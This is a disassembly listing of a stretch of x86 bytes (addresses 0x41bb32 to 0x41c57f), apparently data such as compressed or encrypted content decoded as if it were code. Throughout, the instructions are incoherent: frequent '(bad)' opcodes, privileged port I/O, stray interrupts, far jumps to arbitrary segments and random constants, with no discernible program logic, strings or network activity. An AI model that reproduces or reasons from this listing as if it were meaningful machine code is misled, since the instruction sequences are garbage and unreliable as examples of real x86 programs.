  41bb32:	in     eax,0x2f
  41bb34:	pop    ds
  41bb35:	rcr    BYTE PTR [eax-0x64b0a2b3],0x52
  41bb3c:	add    al,0xe3
  41bb3e:	mov    ch,0x68
  41bb40:	push   0x493955b5
  41bb45:	mov    edi,0xb9dfd668
  41bb4a:	inc    eax
  41bb4b:	jnp    0x41bb17
  41bb4d:	fcom   DWORD PTR [eax]
  41bb4f:	pop    ebx
  41bb50:	push   ss
  41bb51:	inc    esi
  41bb52:	sub    bh,BYTE PTR [edi+0x1e]
  41bb55:	ds mov ah,dh
  41bb58:	jbe    0x41bbb4
  41bb5a:	test   DWORD PTR [ecx-0x289af246],edi
  41bb60:	fs (bad) 
  41bb62:	and    al,0xcb
  41bb64:	cmp    dh,ch
  41bb66:	shl    DWORD PTR [eax-0x5902c1b2],1
  41bb6c:	les    ebx,FWORD PTR [eax+0x0]
	...
  41bbd6:	or     bh,BYTE PTR [eax-0x4048555b]
  41bbdc:	(bad)  
  41bbde:	jg     0x41bbe5
  41bbe0:	arpl   WORD PTR [edi-0x25],cx
  41bbe3:	jb     0x41bc14
  41bbe5:	in     eax,0x67
  41bbe7:	sub    al,BYTE PTR [ecx]
  41bbe9:	add    BYTE PTR [eax],al
  41bbeb:	add    DWORD PTR [eax],eax
  41bbed:	add    BYTE PTR [edx],bl
  41bbef:	in     al,dx
  41bbf0:	lahf   
  41bbf1:	or     bh,BYTE PTR [ebx-0x38]
  41bbf4:	sbb    BYTE PTR [esi],0xbc
  41bbf7:	mov    bh,BYTE PTR fs:[ecx+esi*1+0x77]
  41bbfc:	pop    ebx
  41bbfd:	(bad)  
  41bbfe:	test   al,0x2e
  41bc00:	mov    ebp,0x21fe3f2
  41bc05:	jnp    0x41bc73
  41bc07:	(bad)
  41bc0b:	xchg   edi,eax
  41bc0c:	inc    ebx
  41bc0d:	cld    
  41bc0e:	sub    BYTE PTR [ebx],al
  41bc10:	pop    edx
  41bc11:	retf   0x3842
  41bc14:	(bad)  
  41bc15:	aas    
  41bc16:	cmp    edx,esi
  41bc18:	jge    0x41bc29
  41bc1a:	leave  
  41bc1b:	popa   
  41bc1c:	test   eax,0x4176dc7
  41bc21:	lock mov eax,DWORD PTR [edi-0x1f]
  41bc25:	xlat   BYTE PTR ds:[ebx]
  41bc26:	add    DWORD PTR [ebx-0x10],edx
  41bc29:	out    dx,al
  41bc2a:	jmp    0xc843:0x8ea96233
  41bc31:	ret    0x8bef
  41bc34:	inc    ebx
  41bc35:	xchg   ebp,eax
  41bc36:	pop    ss
  41bc37:	mov    dh,0xa2
  41bc39:	into   
  41bc3a:	sbb    al,0x8c
  41bc3c:	(bad)  
  41bc3d:	adc    eax,0x934dc9ac
  41bc42:	(bad)  
  41bc43:	mov    WORD PTR [edi],es
  41bc45:	lods   al,BYTE PTR ds:[esi]
  41bc46:	pop    ecx
  41bc47:	and    cl,BYTE PTR [esi]
  41bc49:	jcxz   0x41bcac
  41bc4c:	or     ecx,DWORD PTR [ecx-0x65]
  41bc4f:	pop    edx
  41bc50:	int3   
  41bc51:	jle    0x41bbff
  41bc53:	push   0x334e68ce
  41bc58:	int    0x5b
  41bc5a:	mov    ebp,0xa4b545b6
  41bc5f:	sbb    DWORD PTR [edx+0x2e23e7],ecx
  41bc65:	push   eax
  41bc66:	in     al,0xaf
  41bc68:	aas    
  41bc69:	in     al,0xcf
  41bc6b:	lea    esp,[edx]
  41bc6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc6e:	add    dl,BYTE PTR [esi+0xd]
  41bc71:	ror    DWORD PTR [esi-0x7ba9b0c6],cl
  41bc77:	dec    edi
  41bc78:	xchg   edx,eax
  41bc79:	je     0x41bc6c
  41bc7b:	loopne 0x41bc2e
  41bc7d:	xchg   ecx,eax
  41bc7e:	inc    edi
  41bc7f:	les    edi,FWORD PTR [edx]
  41bc81:	mov    eax,0xc0990303
  41bc86:	or     edx,DWORD PTR ds:0x64eea1ea
  41bc8c:	mov    cl,0xc9
  41bc8e:	add    BYTE PTR [edx+0x1c],bh
  41bc91:	xchg   edi,eax
  41bc92:	aaa    
  41bc93:	pusha  
  41bc94:	sti    
  41bc95:	mov    ch,0x3a
  41bc97:	idiv   BYTE PTR [esi-0x6c1f8be0]
  41bc9d:	inc    edx
  41bc9e:	call   0xdd074ca
  41bca3:	stc    
  41bca4:	and    ch,BYTE PTR [edx+0x36]
  41bca7:	or     DWORD PTR [ebx-0x453b18eb],0x61
  41bcae:	(bad)  
  41bcaf:	call   0x3f70ac27
  41bcb4:	imul   edi,ebp,0xb0d8cd0e
  41bcba:	add    DWORD PTR [ebx],ebx
  41bcbc:	test   eax,0xb407898
  41bcc1:	test   eax,0x26641651
  41bcc6:	add    al,0x68
  41bcc8:	daa    
  41bcc9:	int    0xb4
  41bccb:	les    edi,FWORD PTR [edi+0x3]
  41bcce:	shl    BYTE PTR [ebx-0x6b5b9a58],cl
  41bcd4:	mov    edi,0xe45f1d
  41bcd9:	retf   
  41bcda:	iret   
  41bcdb:	ret    0x326
  41bcde:	add    eax,edx
  41bce0:	xor    DWORD PTR [ecx],esp
  41bce2:	xor    ebp,eax
  41bce4:	(bad)  
  41bce5:	int    0x5a
  41bce7:	jmp    0x6a213d0b
  41bcec:	add    eax,0x4a
	...
  41bd55:	add    dl,dl
  41bd57:	xor    bh,dl
  41bd59:	clc    
  41bd5a:	cli    
  41bd5b:	clc    
  41bd5c:	sar    BYTE PTR [edx],cl
  41bd5e:	sti    
  41bd5f:	mov    ebp,0xd47ad9d8
  41bd64:	jge    0x41bd00
  41bd66:	sub    eax,DWORD PTR [bx+di]
  41bd69:	add    BYTE PTR [eax],al
  41bd6b:	add    DWORD PTR [eax],eax
  41bd6d:	add    BYTE PTR [edx+0x46672640],cl
  41bd73:	or     al,0x59
  41bd75:	pop    ebp
  41bd76:	sar    esp,0x67
  41bd79:	pop    ebp
  41bd7a:	xchg   ebx,eax
  41bd7b:	jmp    0x95ed:0x399929c8
  41bd82:	sar    ch,cl
  41bd84:	sub    ebx,DWORD PTR [ebx+0x489d9315]
  41bd8a:	and    bl,BYTE PTR [ecx-0xeba8353]
  41bd90:	lahf   
  41bd91:	jns    0x41bde6
  41bd93:	jae    0x41bd6a
  41bd95:	sub    ah,bh
  41bd97:	xor    DWORD PTR fs:[ebp+ebp*8-0x46880c80],esp
  41bd9f:	in     al,0x31
  41bda1:	xchg   ebp,eax
  41bda2:	push   cs
  41bda3:	xchg   DWORD PTR [ecx+ebx*8],esp
  41bda6:	fst    DWORD PTR [edx]
  41bda8:	adc    al,0x92
  41bdaa:	xchg   edi,eax
  41bdab:	cmp    DWORD PTR [ebx+0x7a4a5242],eax
  41bdb1:	jne    0x41be21
  41bdb3:	outs   dx,DWORD PTR ds:[esi]
  41bdb4:	mov    ecx,0xfc04cb76
  41bdb9:	ds ins BYTE PTR es:[edi],dx
  41bdbb:	stc    
  41bdbc:	inc    ebp
  41bdbd:	lahf   
  41bdbe:	lahf   
  41bdbf:	xchg   ebx,eax
  41bdc0:	pop    es
  41bdc1:	and    al,dl
  41bdc3:	and    al,0x40
  41bdc5:	mov    BYTE PTR [ebx+0x6c],dh
  41bdc8:	push   ss
  41bdc9:	pop    ebx
  41bdca:	call   0x2791b363
  41bdcf:	fistp  QWORD PTR [edx]
  41bdd1:	bound  ebx,QWORD PTR [edx-0x3a72b3e4]
  41bdd7:	arpl   WORD PTR [edx+eax*2],ax
  41bdda:	aam    0xdf
  41bddc:	aam    0x51
  41bdde:	xor    eax,0xe8ff1226
  41bde3:	mov    bl,0x37
  41bde5:	inc    ecx
  41bde6:	sahf   
  41bde7:	aad    0xf3
  41bde9:	sahf   
  41bdea:	mov    BYTE PTR [edi+0x19b0dedd],ch
  41bdf0:	cld    
  41bdf1:	(bad)  
  41bdf2:	lss    edi,FWORD PTR [ebp-0xb]
  41bdf6:	push   ss
  41bdf7:	inc    esp
  41bdf8:	cmp    eax,0xafff58a9
  41bdfd:	imul   esp,DWORD PTR [edi],0xffffff85
  41be00:	fwait
  41be01:	pop    ebp
  41be02:	(bad)  
  41be04:	pop    ebp
  41be05:	cmp    edi,edi
  41be07:	addr16 inc ebx
  41be09:	sar    BYTE PTR [ebx+0x5f],1
  41be0c:	or     DWORD PTR [ecx],0xffffffd7
  41be0f:	dec    ebp
  41be10:	cmp    al,0x8e
  41be12:	iret   
  41be13:	push   esi
  41be14:	loop   0x41bdd0
  41be16:	test   DWORD PTR [edi-0x5b],ecx
  41be19:	ret    0x4557
  41be1c:	imul   edi,edi,0xd1e6b624
  41be22:	pop    ss
  41be23:	xchg   edi,eax
  41be24:	pop    eax
  41be25:	jg     0x41be44
  41be27:	loop   0x41be66
  41be29:	shl    ebx,0x27
  41be2c:	jo     0x41be17
  41be2e:	(bad)  
  41be2f:	fxtract 
  41be31:	ret    
  41be32:	fsub   st,st(0)
  41be34:	mov    ecx,0x3a718a32
  41be39:	retf   
  41be3a:	cmc    
  41be3b:	leave  
  41be3c:	or     al,0x6e
  41be3e:	shl    BYTE PTR [edi],1
  41be40:	jb     0x41be51
  41be42:	or     BYTE PTR [edi+0x6c61f892],bl
  41be48:	js     0x41be74
  41be4a:	mov    ds:0x6080b20b,al
  41be4f:	mov    ecx,0x426d3c55
  41be54:	jl     0x41beb5
  41be56:	push   0x269b55c
  41be5b:	adc    eax,0xda659fc5
  41be60:	scas   al,BYTE PTR es:[edi]
  41be61:	addr16 cdq 
  41be63:	xchg   edi,eax
  41be64:	sbb    al,bl
  41be66:	fbstp  TBYTE PTR [esi]
  41be68:	and    al,0x6d
  41be6a:	mov    esp,?
  41be6c:	pop    es
  41be6d:	scas   eax,DWORD PTR es:[edi]
	...
  41bed6:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41bedc:	imul   edi
  41bede:	mov    ebp,DWORD PTR [ecx-0x6704c09a]
  41bee4:	jne    0x41be96
  41bee6:	addr16 sub al,0x1
  41bee9:	add    BYTE PTR [eax],al
  41beeb:	add    DWORD PTR [eax],eax
  41beed:	add    BYTE PTR [ebp+0x5f],dh
  41bef0:	sar    DWORD PTR [esi-0x3e24b4fc],cl
  41bef6:	inc    eax
  41bef7:	sbb    BYTE PTR [ebx+0x41],bl
  41befa:	cmp    al,BYTE PTR [ebx-0x38]
  41befd:	stos   BYTE PTR es:[edi],al
  41befe:	out    0x21,al
  41bf00:	sub    ch,ch
  41bf02:	xor    BYTE PTR [eax+0x4f],ch
  41bf05:	mov    ebp,0xf094f604
  41bf0a:	enter  0x79c8,0xeb
  41bf0e:	pop    ebx
  41bf0f:	or     al,0xf3
  41bf11:	sbb    edi,DWORD PTR [ebp-0x1fc3892f]
  41bf17:	jns    0x41bead
  41bf19:	test   DWORD PTR [esp+edi*2-0x3b79aff2],esp
  41bf20:	dec    ebp
  41bf21:	xlat   BYTE PTR ds:[ebx]
  41bf22:	sbb    DWORD PTR [edi+0x6d],esp
  41bf25:	jecxz  0x41bf73
  41bf27:	and    BYTE PTR [ecx],cl
  41bf29:	add    DWORD PTR [edi-0xd],ecx
  41bf2c:	inc    ecx
  41bf2d:	push   0xd29a1b06
  41bf32:	jle    0x41bf83
  41bf34:	ror    BYTE PTR [esi+0x37b96e58],cl
  41bf3a:	cdq    
  41bf3b:	call   0x811e:0x2d74744d
  41bf42:	and    ebp,DWORD PTR [eax+0x5cc4a8b2]
  41bf48:	in     al,dx
  41bf49:	repnz jecxz 0x41bfb6
  41bf4c:	fstp   QWORD PTR [ecx+0x4f]
  41bf4f:	or     al,bh
  41bf51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf52:	mov    eax,ds:0x3c7efbf8
  41bf57:	and    cl,BYTE PTR [ebp+0x36ad5fbc]
  41bf5d:	aas    
  41bf5e:	inc    edi
  41bf5f:	mov    ecx,0xb3f36d6
  41bf64:	outs   dx,DWORD PTR ds:[esi]
  41bf65:	dec    esp
  41bf66:	clc    
  41bf67:	jecxz  0x41bf6f
  41bf69:	inc    ecx
  41bf6a:	cdq    
  41bf6b:	out    dx,eax
  41bf6c:	cmc    
  41bf6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf6e:	icebp  
  41bf6f:	sbb    DWORD PTR [ecx],esi
  41bf71:	pop    ss
  41bf72:	pop    eax
  41bf73:	aad    0x2e
  41bf75:	and    edi,DWORD PTR [edx]
  41bf77:	push   ebp
  41bf78:	jo     0x41bf84
  41bf7a:	cmp    eax,0x6c47b096
  41bf7f:	(bad)  [ecx-0x4320301b]
  41bf85:	lock into 
  41bf87:	mov    edi,0x2d428c0a
  41bf8c:	adc    dl,al
  41bf8e:	mov    dl,0xaa
  41bf90:	push   ebp
  41bf91:	ret    
  41bf92:	les    ebx,FWORD PTR [ebp-0x72561764]
  41bf98:	mov    edx,ecx
  41bf9a:	popa   
  41bf9b:	imul   edx,eax,0x4a
  41bf9e:	or     eax,0x46ddbeac
  41bfa3:	aam    0x25
  41bfa5:	inc    ebx
  41bfa6:	sub    eax,0x61115b4f
  41bfab:	dec    esi
  41bfac:	push   ebx
  41bfad:	mov    ds:0x2d62a8ad,al
  41bfb2:	in     al,0x14
  41bfb4:	jle    0x41bfdb
  41bfb6:	jbe    0x41bfb9
  41bfb8:	(bad)  
  41bfb9:	aad    0xae
  41bfbb:	iret   
  41bfbc:	jnp    0x41bfcd
  41bfbe:	int    0xff
  41bfc0:	mov    bh,0x9e
  41bfc2:	push   edx
  41bfc3:	retf   
  41bfc4:	pusha  
  41bfc5:	dec    ebp
  41bfc6:	ret    
  41bfc7:	jnp    0x41bf74
  41bfc9:	cwde   
  41bfca:	retf   
  41bfcb:	mov    ecx,0xa89d842b
  41bfd0:	dec    esp
  41bfd1:	(bad)  
  41bfd2:	lods   al,BYTE PTR fs:[esi]
  41bfd4:	out    0x12,eax
  41bfd6:	stos   DWORD PTR es:[edi],eax
  41bfd7:	add    BYTE PTR [edx-0x5],0xf0
  41bfdb:	mov    dh,0xd4
  41bfdd:	xchg   esp,eax
  41bfde:	into   
  41bfdf:	inc    edx
  41bfe0:	mov    DWORD PTR [ebx-0x23],ebp
  41bfe3:	(bad)  
  41bfe4:	in     al,dx
  41bfe5:	cmp    al,0xa2
  41bfe7:	inc    DWORD PTR [edi]
  41bfe9:	or     al,0x97
  41bfeb:	pop    es
  41bfec:	out    0x1a,al
	...
  41c056:	fs jae 0x41c08c
  41c059:	es aaa 
  41c05b:	data16 jne 0x41c0d1
  41c05e:	ins    BYTE PTR es:[edi],dx
  41c05f:	daa    
  41c060:	mov    cl,0xc1
  41c062:	xchg   ebp,eax
  41c063:	mov    ebx,0x2d678eee
  41c068:	add    DWORD PTR [eax],eax
  41c06a:	add    BYTE PTR [ecx],al
  41c06c:	add    BYTE PTR [eax],al
  41c06e:	das    
  41c06f:	es push ss
  41c071:	jmp    0x41c075
  41c073:	jmp    0x6c7a912
  41c078:	inc    eax
  41c079:	loopne 0x41c097
  41c07b:	mov    al,ds:0x2f80025d
  41c080:	sbb    cl,al
  41c082:	scas   al,BYTE PTR es:[edi]
  41c083:	and    al,0xa4
  41c085:	test   al,0x1f
  41c087:	in     eax,dx
  41c088:	fldenv [edx+0x10b06ca0]
  41c08e:	int    0x88
  41c090:	inc    edx
  41c091:	jno    0x41c107
  41c093:	mov    esp,0xd2e76627
  41c098:	add    al,0xe0
  41c09a:	mov    dh,cl
  41c09c:	lea    edi,[edx*2-0x5cc81d4a]
  41c0a3:	pop    ebx
  41c0a4:	cdq    
  41c0a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0a6:	clc    
  41c0a7:	jle    0x41c0fb
  41c0a9:	cmc    
  41c0aa:	sbb    esi,ebx
  41c0ac:	mov    ch,0x2
  41c0ae:	inc    eax
  41c0af:	xchg   edi,eax
  41c0b0:	jg     0x41c0f3
  41c0b2:	ret    0x8019
  41c0b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0b6:	outs   dx,BYTE PTR ds:[esi]
  41c0b7:	inc    ecx
  41c0b8:	inc    ebx
  41c0b9:	xchg   esp,eax
  41c0ba:	sahf   
  41c0bb:	mov    WORD PTR [edi+ecx*2-0x1542982],es
  41c0c2:	inc    esi
  41c0c3:	lds    esp,FWORD PTR [edi+edx*1-0x8e99c5a]
  41c0ca:	jnp    0x41c11e
  41c0cc:	or     bh,BYTE PTR [esi-0x41b71314]
  41c0d2:	sub    DWORD PTR [edx-0x7724a9a7],0x1c
  41c0d9:	adc    dh,BYTE PTR [eax+0x55]
  41c0dc:	dec    edx
  41c0dd:	sbb    ah,dh
  41c0df:	mov    ebx,0x474158a2
  41c0e4:	mov    ebx,0x30a864a8
  41c0e9:	add    DWORD PTR [esi+0x7be0cbd8],ebp
  41c0ef:	rcl    ebp,0xf
  41c0f2:	dec    ebx
  41c0f3:	ja     0x41c16e
  41c0f5:	into   
  41c0f6:	adc    dh,BYTE PTR [eax+0x3393b065]
  41c0fc:	cli    
  41c0fd:	out    dx,eax
  41c0fe:	cwde   
  41c0ff:	jmp    DWORD PTR [ecx-0x7c]
  41c102:	bound  edi,QWORD PTR cs:[edx]
  41c105:	sub    eax,0xc054994d
  41c10a:	push   eax
  41c10b:	shl    BYTE PTR [ebx+0x8],cl
  41c10e:	aam    0x1
  41c110:	pop    eax
  41c111:	cmp    BYTE PTR [ebx],ch
  41c113:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c114:	xchg   edx,eax
  41c115:	dec    ebp
  41c116:	and    ebx,DWORD PTR [esp+ebx*8-0x6f487a15]
  41c11d:	pop    es
  41c11e:	mov    ss,WORD PTR [esp+ebp*4-0x2cf4e585]
  41c125:	add    DWORD PTR [esi],edx
  41c127:	cs cdq 
  41c129:	(bad)  
  41c12a:	loop   0x41c1a4
  41c12c:	sbb    ch,BYTE PTR [esi-0x80]
  41c12f:	loopne 0x41c17d
  41c131:	ins    DWORD PTR es:[edi],dx
  41c132:	test   eax,0x547becfd
  41c137:	xchg   BYTE PTR [ebx-0x5ffc26ca],al
  41c13d:	test   eax,0xff6f8495
  41c142:	pusha  
  41c143:	mov    al,ds:0xbdaaaad1
  41c148:	cli    
  41c149:	cmc    
  41c14a:	inc    esp
  41c14b:	(bad)  
  41c14c:	fistp  WORD PTR [ecx-0x632c773a]
  41c152:	or     BYTE PTR [eax+0x68],ah
  41c155:	leave  
  41c156:	mov    ebx,0xbd141407
  41c15b:	call   0x1489853d
  41c160:	popa   
  41c161:	lahf   
  41c162:	push   ecx
  41c163:	inc    edi
  41c164:	dec    DWORD PTR [eax+0x0]
  41c167:	fistp  QWORD PTR [edx]
  41c169:	das    
  41c16a:	push   es
  41c16b:	mov    DWORD PTR [ecx+0x2],ecx
	...
  41c1d6:	(bad)  [edx-0x5f]
  41c1d9:	clc    
  41c1da:	mov    bl,0xfb
  41c1dc:	fldcw  WORD PTR [ebx+0x3d]
  41c1df:	add    DWORD PTR ds:0x5c4a88e9,eax
  41c1e5:	fldenv [edi+0x2e]
  41c1e8:	add    DWORD PTR [eax],eax
  41c1ea:	add    BYTE PTR [ecx],al
  41c1ec:	add    BYTE PTR [eax],al
  41c1ee:	fisttp DWORD PTR [ebx+0x62]
  41c1f1:	dec    ebp
  41c1f2:	jbe    0x41c1db
  41c1f4:	adc    eax,0x9c2cea65
  41c1f9:	push   0xf8e1bb07
  41c1fe:	fadd   st,st(1)
  41c200:	fimul  WORD PTR [esi]
  41c202:	mov    ebx,0xa39370ca
  41c207:	or     bh,ah
  41c209:	ror    DWORD PTR [edi+0x46],1
  41c20c:	arpl   dx,dx
  41c20e:	pop    edi
  41c20f:	inc    esi
  41c210:	cmp    eax,0x67d76e17
  41c215:	addr16 leave 
  41c217:	push   edx
  41c218:	add    dh,cl
  41c21a:	retf   
  41c21b:	call   0x96b36b14
  41c220:	pop    ebp
  41c221:	xlat   BYTE PTR ds:[ebx]
  41c222:	test   al,0x45
  41c224:	mov    bh,0x38
  41c226:	push   esi
  41c227:	pop    ds
  41c228:	and    edi,ecx
  41c22a:	test   BYTE PTR [ebp-0x2169912e],bl
  41c230:	sbb    al,0x23
  41c232:	test   dl,dl
  41c234:	test   DWORD PTR [edx-0x4bbed70d],edx
  41c23a:	daa    
  41c23b:	dec    ecx
  41c23c:	xchg   BYTE PTR [eax+eax*4+0x19],bh
  41c240:	push   edx
  41c241:	pop    es
  41c242:	push   ebx
  41c243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c244:	jmp    0xa124c8da
  41c249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c24a:	scas   al,BYTE PTR es:[edi]
  41c24b:	xor    ax,WORD PTR [ebp-0x7b]
  41c24f:	mov    dh,0x5f
  41c251:	ret    
  41c252:	or     DWORD PTR [edx+eax*4],ebp
  41c255:	sub    bl,BYTE PTR [esi-0x22f49f54]
  41c25b:	shr    DWORD PTR [ebx+0x23],0x88
  41c25f:	and    esi,DWORD PTR [edx]
  41c261:	push   ebp
  41c262:	lea    ecx,[edi-0x5ad05480]
  41c268:	rcl    DWORD PTR ds:0xc954cd5e,cl
  41c26e:	rcr    bh,0x72
  41c271:	fisub  WORD PTR [edx]
  41c273:	jae    0x41c27f
  41c275:	cmp    al,0xb
  41c277:	mul    DWORD PTR [ebx-0x24]
  41c27a:	hlt    
  41c27b:	and    DWORD PTR [edi],edx
  41c27d:	fwait
  41c27e:	call   0x4907fde8
  41c283:	cs cmp al,0x18
  41c286:	add    DWORD PTR [edx-0xceac63a],esp
  41c28c:	mov    ds:0xf31ebe2f,eax
  41c291:	cmp    al,0x71
  41c293:	cs mov ecx,0x4bb71bd9
  41c299:	inc    ebp
  41c29a:	push   0xffffff82
  41c29c:	stos   DWORD PTR es:[edi],eax
  41c29d:	push   edi
  41c29e:	and    al,0xe3
  41c2a0:	push   ecx
  41c2a1:	sbb    BYTE PTR [eax],bh
  41c2a3:	sbb    bh,BYTE PTR [ecx+edx*2+0x2d]
  41c2a7:	and    DWORD PTR [esi-0x3f02497],0xfbff40ed
  41c2b1:	xchg   edi,eax
  41c2b2:	jne    0x41c327
  41c2b4:	push   es
  41c2b5:	fistp  QWORD PTR [ebp+0x669e4f69]
  41c2bb:	cmp    bh,BYTE PTR [esi+ebx*2-0x32f03e87]
  41c2c2:	ret    0xc248
  41c2c5:	call   0xe95fd328
  41c2ca:	xor    al,0x47
  41c2cc:	pminsw mm4,QWORD PTR [edx+0x61]
  41c2d0:	retw   0xc3a0
  41c2d4:	std    
  41c2d5:	retf   
  41c2d6:	mov    bh,0x23
  41c2d8:	fs cmp edi,edx
  41c2db:	jbe    0x41c30a
  41c2dd:	mov    dl,al
  41c2df:	inc    ebx
  41c2e0:	pop    edx
  41c2e1:	cmp    eax,0x720f4698
  41c2e6:	and    al,0x71
  41c2e8:	iret   
  41c2e9:	or     dh,dl
  41c2eb:	cld    
  41c2ec:	hlt    
  41c2ed:	data16 add BYTE PTR [eax],al
	...
  41c354:	add    BYTE PTR [eax],al
  41c356:	repz and ebp,ecx
  41c359:	push   ebp
  41c35a:	(bad)  
  41c35c:	sti    
  41c35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35e:	enter  0x1a95,0x14
  41c362:	mov    al,0x59
  41c364:	pop    ss
  41c365:	inc    esp
  41c366:	addr16 das 
  41c368:	add    DWORD PTR [eax],eax
  41c36a:	add    BYTE PTR [ecx],al
  41c36c:	add    BYTE PTR [eax],al
  41c36e:	fisubr DWORD PTR [edi+ebx*8+0x196b29d6]
  41c375:	scas   al,BYTE PTR es:[edi]
  41c376:	pop    ss
  41c377:	push   edx
  41c378:	cmp    ch,BYTE PTR [eax-0x26]
  41c37b:	pop    edi
  41c37c:	fdivr  QWORD PTR [eax-0x6de276fe]
  41c382:	sub    eax,0xda5bd90
  41c387:	ds (bad) 
  41c389:	add    al,BYTE PTR [esi]
  41c38b:	inc    ecx
  41c38c:	sub    al,cl
  41c38e:	mov    dh,0x15
  41c391:	push   es
  41c392:	xor    ah,ah
  41c394:	imul   edx,DWORD PTR [eax-0x2e23b9c8],0xafae164b
  41c39e:	xchg   edi,eax
  41c39f:	pushf  
  41c3a0:	dec    ecx
  41c3a1:	fistp  DWORD PTR [edx]
  41c3a3:	inc    edx
  41c3a4:	mov    al,ds:0xf790663b
  41c3a9:	adc    ebp,DWORD PTR [esi]
  41c3ab:	xchg   esi,eax
  41c3ac:	cmp    esi,ebp
  41c3ae:	sub    cl,dh
  41c3b0:	mov    WORD PTR [ebp+0x5c],?
  41c3b3:	xchg   esp,eax
  41c3b4:	mov    ds:0x1333d71b,eax
  41c3b9:	repnz (bad) 
  41c3bc:	fstp   QWORD PTR [eax]
  41c3be:	mov    eax,0x1e506515
  41c3c3:	mov    ecx,0x36d56a31
  41c3c8:	jle    0x41c429
  41c3ca:	arpl   WORD PTR [esi+eiz*8+0x4f],di
  41c3ce:	inc    ebx
  41c3cf:	sub    al,0xf8
  41c3d1:	leave  
  41c3d2:	ins    DWORD PTR es:[edi],dx
  41c3d3:	jns    0x41c36b
  41c3d5:	gs int 0xf3
  41c3d8:	xchg   ebx,eax
  41c3d9:	push   edi
  41c3da:	sub    eax,0xdcecc423
  41c3df:	shl    DWORD PTR [ebp+0x1ea7bef9],1
  41c3e5:	(bad)  
  41c3e6:	out    dx,eax
  41c3e7:	mov    dh,0xaa
  41c3e9:	retf   0xbae6
  41c3ec:	cmc    
  41c3ed:	scas   al,BYTE PTR es:[edi]
  41c3ee:	test   dl,ah
  41c3f0:	rcl    BYTE PTR [ebx+0x69be9b0f],0x17
  41c3f7:	sar    DWORD PTR [edx],cl
  41c3f9:	jb     0x41c468
  41c3fb:	push   edi
  41c3fc:	int3   
  41c3fd:	mov    DWORD PTR ds:0x1c5d041b,esi
  41c403:	xchg   ecx,eax
  41c404:	xor    bl,BYTE PTR [eax+eiz*4+0x8]
  41c408:	stos   BYTE PTR es:[edi],al
  41c409:	sbb    DWORD PTR [eax+0x28],0x9f243d7
  41c410:	or     bh,BYTE PTR [ebp+0x5ee83f71]
  41c416:	and    ebx,DWORD PTR [ecx]
  41c418:	imul   BYTE PTR [ecx-0x38ef51f7]
  41c41e:	idiv   ch
  41c420:	popa   
  41c421:	adc    eax,0x4335b921
  41c426:	cld    
  41c427:	call   0xf338aaae
  41c42c:	ret    0xdecf
  41c42f:	cs jge 0x41c3d1
  41c432:	sub    edi,DWORD PTR [edx-0x42f29a2f]
  41c438:	adc    BYTE PTR [esi],dl
  41c43a:	pop    ebp
  41c43b:	pushf  
  41c43c:	sbb    al,0xcc
  41c43e:	jnp    0x41c433
  41c440:	mov    esp,0x68cc4297
  41c445:	shl    DWORD PTR [ebx-0x57],1
  41c448:	xchg   edx,eax
  41c449:	(bad)  
  41c44a:	push   ecx
  41c44b:	gs cmp al,0x4c
  41c44e:	fdiv   QWORD PTR [eax]
  41c450:	mov    ecx,0x28cfcd72
  41c455:	retf   0xbc08
  41c458:	adc    eax,0xb024705f
  41c45d:	adc    DWORD PTR [eax],eax
  41c45f:	sbb    DWORD PTR [ebx*4+0x176f7b8c],esi
  41c466:	sub    al,0x76
  41c468:	push   DWORD PTR [ebx+0xb]
  41c46b:	mov    eax,0x64a8
	...
  41c4d4:	add    BYTE PTR [eax],al
  41c4d6:	push   ebx
  41c4d7:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c4dd:	std    
  41c4de:	mov    bl,0x35
  41c4e0:	dec    ebp
  41c4e1:	push   ecx
  41c4e2:	inc    ebp
  41c4e3:	lods   eax,DWORD PTR ds:[esi]
  41c4e4:	xchg   edi,eax
  41c4e5:	inc    esi
  41c4e6:	xor    BYTE PTR [bx+di],al
  41c4e9:	add    BYTE PTR [eax],al
  41c4eb:	add    DWORD PTR [eax],eax
  41c4ed:	add    BYTE PTR ds:0x1a6789f1,al
  41c4f3:	imul   BYTE PTR [esp+ecx*4-0x29e69a15]
  41c4fa:	pop    esi
  41c4fb:	cmp    cl,BYTE PTR [ebp+ebp*4-0x5d522525]
  41c502:	mov    eax,DWORD PTR [edx]
  41c504:	jno    0x41c535
  41c506:	mov    bh,0x9c
  41c508:	test   cl,al
  41c50a:	mov    bl,BYTE PTR [edi-0x471a199b]
  41c510:	xor    al,0x91
  41c512:	sahf   
  41c513:	or     BYTE PTR [eax-0x1d70a935],0xb5
  41c51a:	sub    dh,BYTE PTR [edx-0x57]
  41c51d:	mov    ds:0x21401654,al
  41c522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c523:	or     cl,BYTE PTR [esi+0x6a]
  41c526:	push   edx
  41c527:	imul   edi,DWORD PTR [esi+0x3a809fd7],0xd263ea0
  41c531:	sub    BYTE PTR [esi],bl
  41c533:	mov    ebp,0xc8fdd31e
  41c538:	fucomp st(4)
  41c53a:	jb     0x41c4f9
  41c53c:	les    edi,FWORD PTR [esi]
  41c53e:	mov    al,ds:0x3c63b144
  41c543:	xor    DWORD PTR [edi+ebp*4+0x581773eb],ecx
  41c54a:	cmc    
  41c54b:	mov    al,0x33
  41c54d:	mov    ebp,0xa6f4c1cb
  41c552:	or     DWORD PTR [edx],ebp
  41c554:	out    0x93,eax
  41c556:	test   al,0x6b
  41c558:	rcr    ebx,0xe0
  41c55b:	addr16 sbb al,0x27
  41c55e:	dec    ebp
  41c55f:	mov    edx,0xd5eea94e
  41c564:	popf   
  41c565:	cwde   
  41c566:	test   eax,0xf071c0a9
  41c56b:	jl     0x41c5e8
  41c56d:	fldln2 
  41c56f:	add    eax,0x24756915
  41c574:	xchg   ecx,eax
  41c575:	sbb    BYTE PTR [edi+0x65772e1d],ah
  41c57b:	int    0xff
  41c57d:	or     al,0x5a
  41c57f:	jne    0x41c5a4
